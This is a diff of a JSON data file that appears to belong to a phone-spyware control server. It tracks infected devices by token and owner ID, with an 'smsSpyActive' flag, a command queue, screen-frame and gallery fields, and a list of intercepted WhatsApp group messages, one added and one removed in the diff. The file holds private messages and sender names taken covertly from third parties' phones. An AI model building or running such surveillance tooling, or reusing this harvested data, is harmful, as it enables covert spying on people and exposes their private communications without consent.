@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775048440805,
+    "lastSeen": 1775048446816,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13930 pesan): ~ syafa karamoy",
+        "content": "semua member wajib cium aku.",
+        "time": "01/04 21:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048447647
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13929 pesan): ~ syafa karamoy",
@@ -4011,14 +4019,6 @@
         "time": "01/04 20:36",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046985704
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13781 pesan): ~ celynn?",
-        "content": "pemimpim arogan",
-        "time": "01/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046985666
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775048441155,
+    "lastSeen": 1775048447596,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
